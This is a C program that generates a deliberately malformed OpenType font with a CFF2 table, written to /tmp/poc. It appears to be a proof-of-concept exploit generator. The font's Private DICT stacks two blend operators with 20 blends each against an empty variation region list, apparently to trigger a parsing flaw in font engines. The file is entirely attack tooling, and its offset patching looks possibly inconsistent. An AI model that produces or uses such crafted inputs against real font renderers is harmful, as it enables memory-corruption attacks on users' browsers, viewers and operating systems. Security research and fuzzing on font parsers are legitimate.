#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

static void w16(FILE *f, uint16_t v) {
    fputc((v >> 8) & 0xff, f);
    fputc(v & 0xff, f);
}

static void w32(FILE *f, uint32_t v) {
    fputc((v >> 24) & 0xff, f);
    fputc((v >> 16) & 0xff, f);
    fputc((v >> 8) & 0xff, f);
    fputc(v & 0xff, f);
}

static void push_int(FILE *f, int v) {
    if (v >= 0 && v <= 107) {
        fputc(v + 139, f);
    } else if (v >= 108 && v <= 1131) {
        int b1 = (v - 108) / 256;
        int b0 = (v - 108) % 256;
        fputc(247 + b1, f);
        fputc(b0, f);
    } else {
        fputc(28 + ((v >> 8) & 0xff), f);
        fputc(v & 0xff, f);
    }
}

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    /* --- OpenType header: OTTO, 1 table (CFF2) --- */
    fputc(0x4f, f); fputc(0x54, f); fputc(0x4f, f); fputc(0x54, f);
    w16(f, 1);    /* numTables */
    w16(f, 16);   /* searchRange */
    w16(f, 0);    /* entrySelector */
    w16(f, 0);    /* rangeShift */

    /* Table record: 'CFF2' */
    fputc(0x43, f); fputc(0x46, f); fputc(0x46, f); fputc(0x32, f);
    long off_pos = ftell(f);
    w32(f, 0);
    long len_pos = ftell(f);
    w32(f, 0);

    /* === CFF2 data === */
    long cff_start = ftell(f);

    /* CFF2 Header: major=2, minor=0, hdrSize=5, offSize=1, padding=0 */
    fputc(0x02, f); fputc(0x00, f); fputc(0x05, f); fputc(0x01, f); fputc(0x00, f);

    /* topDictLength placeholder */
    long top_dict_len_pos = ftell(f);
    w16(f, 0);

    /* Top DICT data: vstore, FDArray, CharStrings (placeholders) */
    long top_dict_start = ftell(f);
    fputc(0x8B, f);  /* push 0 (vstore_offset placeholder) */
    fputc(0x0C, f); fputc(0x18, f); /* vstore operator */
    fputc(0x8B, f);  /* push 0 (fdarray_offset placeholder) */
    fputc(0x0C, f); fputc(0x24, f); /* FDArray operator */
    fputc(0x8B, f);  /* push 0 (charstrings_offset placeholder) */
    fputc(0x0C, f); fputc(0x07, f); /* CharStrings operator */
    long top_dict_end = ftell(f);
    long top_dict_size = top_dict_end - top_dict_start;

    /* Global Subr INDEX (CFF2): count=0, offSize=1, offset[0]=1 */
    w32(f, 0);
    fputc(1, f);
    fputc(1, f);

    /* FDArray INDEX (CFF2): count=1, offSize=1, offsets, Font DICT data */
    long fdarray_start = ftell(f);
    long fdarray_offset = fdarray_start - cff_start;
    w32(f, 1);
    fputc(1, f);
    fputc(1, f);
    long fdarray_off1_pos = ftell(f);
    fputc(0, f);    /* placeholder for offset[1] */

    /* Font DICT data (with placeholders for priv_size and priv_offset) */
    long font_dict_start = ftell(f);
    long priv_size_placeholder_pos = ftell(f);
    push_int(f, 0);
    long priv_offset_placeholder_pos = ftell(f);
    push_int(f, 0);
    fputc(0x12, f); /* Private operator */
    long font_dict_end = ftell(f);
    long font_dict_size = font_dict_end - font_dict_start;

    /* Patch FDArray offset[1] = font_dict_size + 1 */
    fseek(f, fdarray_off1_pos, SEEK_SET);
    fputc((uint8_t)(font_dict_size + 1), f);
    fseek(f, 0, SEEK_END);

    /* VariationStore (format 0): format=0, regionListOffset, itemVariationDataCount=1 */
    long vstore_start = ftell(f);
    long vstore_offset = vstore_start - cff_start;
    w16(f, 0);      /* format = 0 */
    w32(f, 6);      /* variationRegionListOffset = 6 */
    w16(f, 1);      /* itemVariationDataCount = 1 */
    w32(f, 10);     /* itemVariationDataOffsets[0] = 10 */
    /* VariationRegionList: axisCount=1, regionCount=0 */
    w16(f, 1);      /* axisCount = 1 */
    w16(f, 0);      /* regionCount = 0 */
    /* ItemVariationData: itemCount=1, shortDeltaCount=0, regionIndexCount=0 */
    w16(f, 1);      /* itemCount = 1 */
    w16(f, 0);      /* shortDeltaCount = 0 */
    w16(f, 0);      /* regionIndexCount = 0 */

    /* Private DICT: vsindex (0x0C 0x1C), then two blend operators.
       Correct operand order for blend: push numBlends, push base, then pairs.
    */
    long priv_start = ftell(f);
    long priv_offset = priv_start - cff_start;
    /* vsindex */
    fputc(0x8B, f);  /* push 0 */
    fputc(0x0C, f); fputc(0x1C, f); /* vsindex operator */
    /* First blend: push numBlends=20, push base=0, then 20 pairs of (value=0, blend=0) */
    fputc(0x9F, f);  /* push 20 (numBlends) */
    fputc(0x8B, f);  /* push 0 (base) */
    for (int i = 0; i < 20; i++) {
        fputc(0x8B, f); fputc(0x8B, f);
    }
    fputc(0x0C, f); fputc(0x1A, f); /* blend operator */
    /* Second blend: same order */
    fputc(0x9F, f);  /* push 20 (numBlends) */
    fputc(0x8B, f);  /* push 0 (base) */
    for (int i = 0; i < 20; i++) {
        fputc(0x8B, f); fputc(0x8B, f);
    }
    fputc(0x0C, f); fputc(0x1A, f); /* blend operator */
    long priv_end = ftell(f);
    long priv_size = priv_end - priv_start;

    /* CharStrings INDEX (CFF2): count=1, one glyph with endchar */
    long charstrings_start = ftell(f);
    long charstrings_offset = charstrings_start - cff_start;
    w32(f, 1);
    fputc(1, f);
    fputc(1, f);
    fputc(2, f);
    fputc(0x0E, f); /* endchar */

    /* Patch priv_size and priv_offset in Font DICT */
    fseek(f, priv_size_placeholder_pos, SEEK_SET);
    push_int(f, (int)priv_size);
    fseek(f, priv_offset_placeholder_pos, SEEK_SET);
    push_int(f, (int)priv_offset);

    /* Patch topDictLength */
    fseek(f, top_dict_len_pos, SEEK_SET);
    w16(f, (uint16_t)top_dict_size);

    /* Patch Top DICT: vstore_offset, fdarray_offset, charstrings_offset */
    fseek(f, top_dict_start, SEEK_SET);
    push_int(f, (int)vstore_offset);
    fputc(0x0C, f); fputc(0x18, f);
    push_int(f, (int)fdarray_offset);
    fputc(0x0C, f); fputc(0x24, f);
    push_int(f, (int)charstrings_offset);
    fputc(0x0C, f); fputc(0x07, f);

    /* Patch table record offsets */
    long cff_end = ftell(f);
    fseek(f, off_pos, SEEK_SET);
    w32(f, (uint32_t)(cff_start));
    fseek(f, len_pos, SEEK_SET);
    w32(f, (uint32_t)(cff_end - cff_start));

    fclose(f);
    return 0;
}